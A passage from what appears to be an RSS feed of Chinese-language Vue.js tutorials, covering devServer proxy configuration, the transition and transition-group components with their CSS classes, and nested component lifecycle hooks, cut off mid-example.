<h1 id="完整配置" data-numberify>完整配置<a class="anchor ms-1" href="#完整配置"></a></h1>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">devServer</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">proxy</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="s1">&#39;/api&#39;</span><span class="o">:</span> <span class="p">{</span>             <span class="c1">// 访问代理时的路径前缀
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">target</span><span class="o">:</span> <span class="s1">&#39;&lt;url&gt;&#39;</span><span class="p">,</span>    <span class="c1">// 代理的目标路径
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">ws</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span>           <span class="c1">// 是否支持 webSocket
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">changeOrigin</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span> <span class="c1">// 是否将请求头中的Host改成与target一样的Host（默认为true）
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="p">},</span>
</span></span><span class="line"><span class="cl">      <span class="s1">&#39;/foo&#39;</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">target</span><span class="o">:</span> <span class="s1">&#39;&lt;other_url&gt;&#39;</span>
</span></span><span class="line"><span class="cl">      <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>例如：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">devServer</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">proxy</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="s1">&#39;/api&#39;</span><span class="o">:</span> <span class="p">{</span>                           <span class="c1">// 路径前缀
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">target</span><span class="o">:</span> <span class="s1">&#39;http://localhost:5000&#39;</span><span class="p">,</span>  <span class="c1">// 代理目标
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">ws</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>那么在使用代理请求<code>http://localhost:5000</code>的资源时，除了使用当前服务的Host外，还需要加上路径前缀<code>/api</code>。即通过<code>http://localhost:8080/api</code>对<code>http://localhost:5000</code>的资源进行访问。</p>
<p>在使用<code>http://localhost:8080/api</code>访问时，代理会将整个访问路径（包括前缀）原封不动地转发给<code>http://localhost:5000</code>这个服务器。例如请求<code>http://localhost:8080/api/user</code>那么<code>http://localhost:5000</code>会接收到<code>/api/user</code>这个请求。</p>
<p>如果在转发时要将路径前缀去掉（例如请求<code>http://localhost:8080/api/user</code>，<code>http://localhost:5000</code>接收到的是<code>/user</code>请求），可以配置路径转发规则<code>pathRewrite</code>：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">devServer</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">proxy</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="s1">&#39;/api&#39;</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">target</span><span class="o">:</span> <span class="s1">&#39;http://localhost:5000&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nx">pathRewrite</span><span class="o">:</span> <span class="p">{</span>  <span class="c1">// 路径转发规则
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>          <span class="c1">// key：用于匹配路径的正则匹配表达式
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>          <span class="c1">// value：是替换路径中匹配的内容
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>          <span class="s1">&#39;^/api&#39;</span><span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="p">},</span>
</span></span><span class="line"><span class="cl">        <span class="nx">ws</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nx">changeOrigin</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>在微服务架构中，一个服务使用一台（或多台）服务器运行，那么可以根据服务来精简配置项。例如：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">devServer</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">proxy</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="s1">&#39;/users&#39;</span><span class="o">:</span> <span class="p">{</span>  <span class="c1">// http://localhost:5000/users
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">target</span><span class="o">:</span> <span class="s1">&#39;http://localhost:5000&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="p">},</span>
</span></span><span class="line"><span class="cl">      <span class="s1">&#39;/orders&#39;</span><span class="o">:</span> <span class="p">{</span>  <span class="c1">// http://localhost:5001/orders
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">target</span><span class="o">:</span> <span class="s1">&#39;http://localhost:5001&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>使用完整配置时的优缺点如下：</p>
<ul>
<li>优点：可以配置多个代理，可以灵活地控制请求是否使用代理。</li>
<li>缺点：配置略繁琐，请求资源时必须使用路径前缀。</li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>Vue 过渡和动画</title>
      <link>/docs/vue/animations/</link>
      <pubDate>Wed, 20 Sep 2023 09:47:53 +0000</pubDate>
      
      <guid>/docs/vue/animations/</guid>
      <description><![CDATA[Vue封装了一套可以快速构建基于状态变化的过渡和过度与动画的组件&lt;transition&gt;（&lt;Transition&gt;）]]></description>
      <content:encoded><![CDATA[<p>Vue封装了一套可以快速构建基于状态变化的过渡和过度与动画的组件<code>&lt;transition&gt;</code>（<code>&lt;Transition&gt;</code>）和<code>&lt;transition-group&gt;</code>（<code>&lt;TransitionGroup&gt;</code>）。</p>
<p><code>&lt;transition&gt;</code>和<code>&lt;transition-group&gt;</code>是Vue内置的组件，无需注册即可使用。它们可以将进入和离开的动画应用到通过默认插槽传递给它的元素或组件上。</p>
<p>它们的进入/离开动画的切换可以由<code>v-if</code>或<code>v-show</code>所触发。</p>
<hr>
<h1 id="transition-组件" data-numberify>Transition 组件<a class="anchor ms-1" href="#transition-组件"></a></h1>
<p><code>&lt;transition&gt;</code>用于在一个元素或组件进入和离开DOM时应用动画。</p>
<p>最基本的用法如下：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">button</span> <span class="err">@</span><span class="na">click</span><span class="o">=</span><span class="s">&#34;isShow = !isShow&#34;</span><span class="p">&gt;</span>显示/隐藏<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="c">&lt;!-- 
</span></span></span><span class="line"><span class="cl"><span class="c">    &lt;transition&gt; 用于给元素自动加上动画效果
</span></span></span><span class="line"><span class="cl"><span class="c">   --&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">transition</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">h1</span> <span class="na">v-show</span><span class="o">=</span><span class="s">&#34;isShow&#34;</span><span class="p">&gt;</span>Hello Vue.js!<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">transition</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="kr">export</span> <span class="k">default</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;Hello&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">data</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">isShow</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">style</span> <span class="na">scoped</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">h1</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">background-color</span><span class="p">:</span> <span class="kc">orange</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">.</span><span class="nc">v-enter-active</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">animation</span><span class="p">:</span> <span class="n">fade</span> <span class="mi">1</span><span class="kt">s</span> <span class="kc">linear</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">.</span><span class="nc">v-leave-active</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">animation</span><span class="p">:</span> <span class="n">fade</span> <span class="mi">1</span><span class="kt">s</span> <span class="kc">linear</span> <span class="kc">reverse</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">@</span><span class="k">keyframes</span> <span class="nt">fade</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nt">from</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">transform</span><span class="p">:</span> <span class="nb">translateX</span><span class="p">(</span><span class="mi">-100</span><span class="kt">%</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="nt">to</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">transform</span><span class="p">:</span> <span class="nb">translateX</span><span class="p">(</span><span class="mi">0</span><span class="kt">px</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>当<code>&lt;transition&gt;</code>中的元素被显示或隐藏时，Vue会在适当的时机自动将一些CSS过渡<code>class</code>往目标元素上添加或移除。</p>
<blockquote>
<p><code>&lt;transition&gt;</code>仅支持单个元素或组件作为其插槽内容。如果内容是一个组件，该组件必须仅有一个根元素。</p>
</blockquote>
<hr>
<h1 id="css-过渡-class" data-numberify>CSS 过渡 class<a class="anchor ms-1" href="#css-过渡-class"></a></h1>
<p>Vue中一共有6种应用于进入与离开过度效果的 CSS <code>class</code>：</p>
<p>Vue2的CSS过渡<code>class</code>：</p>
<p><picture><img class="img-fluid " alt="Vue2 CSS 过渡 class" src="/docs/vue/animations/1695255059938.png" loading="lazy" width="1200" height="600" />
</picture>

</p>
<p>Vue3的CSS过渡<code>class</code>：</p>
<p><picture><img class="img-fluid " alt="Vue3 CSS 过渡 class" src="/docs/vue/animations/1695253388660.png" loading="lazy" width="1376" height="700" />
</picture>

</p>
<ul>
<li><code>v-enter</code>（Vue2）/ <code>v-enter-from</code>（Vue3）：进入动画的起始状态。在元素插入之前添加，在元素插入完成后的下一帧移除。</li>
<li><code>v-enter-active</code>：进入动画的生效状态。应用于整个进入动画阶段。在元素被插入之前添加，在过渡或动画完成之后移除。这个<code>class</code>可以被用来定义进入动画的持续时间、延迟与速度曲线类型。</li>
<li><code>v-enter-to</code>（<code>2.1.8</code>版及以上）：进入动画的结束状态。在元素插入完成后的下一帧被添加 (也就是<code>v-enter-from</code>被移除的同时)，在过渡或动画完成之后移除。</li>
<li><code>v-leave</code>（Vue2）/ <code>v-leave-from</code>（Vue3）：离开动画的起始状态。在离开过渡效果被触发时立即添加，在一帧后被移除。</li>
<li><code>v-leave-active</code>：离开动画的生效状态。应用于整个离开动画阶段。在离开过渡效果被触发时立即添加，在过渡或动画完成之后移除。这个<code>class</code>可以被用来定义离开动画的持续时间、延迟与速度曲线类型。</li>
<li><code>v-leave-to</code>（<code>2.1.8</code>版及以上）：离开动画的结束状态。在一个离开动画被触发后的下一帧被添加 (也就是<code>v-leave-from</code>被移除的同时)，在过渡或动画完成之后移除。</li>
</ul>
<blockquote>
<p>注：Vue3将过渡类名<code>v-enter</code>修改为<code>v-enter-from</code>，将过渡类名<code>v-leave</code>修改为<code>v-leave-from</code>。</p>
</blockquote>
<hr>
<h1 id="过度效果命名" data-numberify>过度效果命名<a class="anchor ms-1" href="#过度效果命名"></a></h1>
<p><code>&lt;transition&gt;</code>和<code>&lt;transition-group&gt;</code>有一个名为<code>name</code>的<code>prop</code>，它可以为过渡效果命名，并将该名称作用于其一系列CSS过渡<code>class</code>的名称前缀。</p>
<p>例如：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">transition</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;fade&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="c">&lt;!-- ... --&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">transition</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>那么其一系列的CSS过渡<code>class</code>的名称如下：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-css" data-lang="css"><span class="line"><span class="cl"><span class="c">/* 进入的起点 和 离开的终点 */</span>
</span></span><span class="line"><span class="cl"><span class="p">.</span><span class="nc">fade-enter</span> <span class="c">/* 或 .fade-enter-from */</span><span class="o">,</span>
</span></span><span class="line"><span class="cl"><span class="p">.</span><span class="nc">fade-leave-to</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">transform</span><span class="p">:</span> <span class="nb">translateX</span><span class="p">(</span><span class="mi">-100</span><span class="kt">%</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">/* 进入 和 离开的过程 */</span>
</span></span><span class="line"><span class="cl"><span class="p">.</span><span class="nc">fade-enter-active</span><span class="o">,</span>
</span></span><span class="line"><span class="cl"><span class="p">.</span><span class="nc">fade-leave-active</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">transition</span><span class="p">:</span> <span class="mf">0.5</span><span class="kt">s</span> <span class="kc">linear</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">/* 进入的终点 和 离开的起点 */</span>
</span></span><span class="line"><span class="cl"><span class="p">.</span><span class="nc">fade-enter-to</span><span class="o">,</span>
</span></span><span class="line"><span class="cl"><span class="p">.</span><span class="nc">fade-leave</span> <span class="c">/* 或 .fade-leave-from */</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">transform</span><span class="p">:</span> <span class="nb">translateX</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><hr>
<h1 id="自定义过渡-class" data-numberify>自定义过渡 class<a class="anchor ms-1" href="#自定义过渡-class"></a></h1>
<p>可以向<code>&lt;transition&gt;</code>和<code>&lt;transition-group&gt;</code>传递以下的<code>props</code>来指定自定义的过渡<code>class</code>。</p>
<ul>
<li><code>enter-class</code>（Vue2）/ <code>enter-from-class</code>（Vue3）：定义目标元素<u>进入动画起点</u>的过渡<code>class</code>。</li>
<li><code>enter-active-class</code>：定义目标元素<u>进入动画过程</u>的过渡<code>class</code>。</li>
<li><code>enter-to-class</code>（<code>2.1.8+</code>）：定义目标元素<u>进入动画终点</u>的过渡<code>class</code>。</li>
<li><code>leave-class</code>（Vue2）/ <code>leave-from-class</code>（Vue3）：定义目标元素<u>离开动画起点</u>的过渡<code>class</code>。</li>
<li><code>leave-active-class</code>：定义目标元素<u>离开动画过程</u>的过渡<code>class</code>。</li>
<li><code>leave-to-class</code>（<code>2.1.8+</code>）：定义目标元素<u>离开动画终点</u>的过渡<code>class</code>。</li>
</ul>
<p>传入的这些<code>class</code>会覆盖相应阶段的默认<code>class</code>名。这个功能在Vue的动画机制下集成其他的第三方CSS动画库时非常有用。</p>
<p>例如使用<code>animate.css</code>：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">button</span> <span class="err">@</span><span class="na">click</span><span class="o">=</span><span class="s">&#34;isShow = !isShow&#34;</span><span class="p">&gt;</span>显示/隐藏<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">transition</span>
</span></span><span class="line"><span class="cl">    <span class="na">appear</span>
</span></span><span class="line"><span class="cl">    <span class="na">name</span><span class="o">=</span><span class="s">&#34;animate__animated animate__bounce&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="na">enter-active-class</span><span class="o">=</span><span class="s">&#34;animate__swing&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="na">leave-active-class</span><span class="o">=</span><span class="s">&#34;animate__backOutUp&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">h1</span> <span class="na">v-show</span><span class="o">=</span><span class="s">&#34;!isShow&#34;</span><span class="p">&gt;</span>Hello Vue.js!<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">transition</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="kr">import</span> <span class="s1">&#39;animate.css&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kr">export</span> <span class="k">default</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;Hello&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">data</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">isShow</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">style</span> <span class="na">scoped</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">h1</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">background-color</span><span class="p">:</span> <span class="kc">orange</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
</span></span></code></pre></div><hr>
<h1 id="transitiongroup-组件" data-numberify>TransitionGroup 组件<a class="anchor ms-1" href="#transitiongroup-组件"></a></h1>
<p><code>&lt;transition-group&gt;</code>支持和<code>&lt;transition&gt;</code>基本相同的<code>props</code>、CSS过渡<code>class</code>和JavaScript钩子监听器，但有以下几点区别：</p>
<ul>
<li>默认情况下，它不会渲染一个容器元素。但可以通过传入<code>tag</code> prop来指定一个元素作为容器元素来渲染。</li>
<li>过渡模式在这里不可用，因为我们不再是在互斥的元素之间进行切换。</li>
<li><code>&lt;transition-group&gt;</code>中渲染的每个元素都必须有一个唯一的<code>key</code>属性值。</li>
<li>CSS过渡<code>class</code>会被应用在列表内的元素上，而不是容器元素上。</li>
</ul>
<p><code>&lt;transition-group&gt;</code>用于同时渲染多个元素，通常情况下渲染的是列表元素。被<code>&lt;transition-group&gt;</code>渲染的每个元素都需要有一个我i唯一的<code>key</code>属性值。</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>Vue 组件生命周期</title>
      <link>/docs/vue/components/life-cycle/</link>
      <pubDate>Wed, 20 Sep 2023 00:12:12 +0000</pubDate>
      
      <guid>/docs/vue/components/life-cycle/</guid>
      <description><![CDATA[在Vue中，每个组件都有其对应的生命周期，这个过程与Vue 生命周期中描述的过程一致。 Vue组件的生命周期图示如下： 下图是尚硅谷天禹所给的有关]]></description>
      <content:encoded><![CDATA[<p>在Vue中，每个组件都有其对应的生命周期，这个过程与<a href="../../life-cycle">Vue 生命周期</a>中描述的过程一致。</p>
<p>Vue组件的生命周期图示如下：</p>
<p><picture><img class="img-fluid " alt="Vue.js 生命周期" src="/docs/vue/components/life-cycle/1694591410572.png" loading="lazy" width="1266" height="2002" />
</picture>

</p>
<p>下图是尚硅谷天禹所给的有关Vue生命周期的解释：</p>
<p><picture><img class="img-fluid " alt="Vue.js 生命周期解释" src="/docs/vue/components/life-cycle/1694591763923.png" loading="lazy" width="1469" height="1892" />
</picture>

</p>
<hr>
<h1 id="嵌套组件的生命周期" data-numberify>嵌套组件的生命周期<a class="anchor ms-1" href="#嵌套组件的生命周期"></a></h1>
<p>定义存在嵌套关系的组件：</p>
<p><code>App.vue</code>（父组件，3秒后自动销毁）：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>App.vue<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">UserInfo</span><span class="p">/&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="kr">import</span> <span class="nx">SubComponent</span> <span class="nx">from</span> <span class="s1">&#39;./components/SubComponent.vue&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kr">export</span> <span class="k">default</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;app&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">components</span><span class="o">:</span> <span class="p">{</span><span class="nx">SubComponent</span><span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nx">beforeCreate</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;App beforeCreate...&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nx">created</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;App created...&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nx">beforeMount</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;App beforeMount...&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nx">mounted</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;App mounted...&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// 3秒后自动销毁
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">setTimeout</span><span class="p">(()</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">this</span><span class="p">.</span><span class="nx">$destroy</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span> <span class="mi">3000</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nx">beforeDestroy</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;App beforeDestroy...&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nx">destroyed</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;App destroyed...&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><p><code>SubComponent.vue</code>（子组件，不自动销毁）：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">h2</span><span class="p">&gt;</span>SubComponent.vue<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
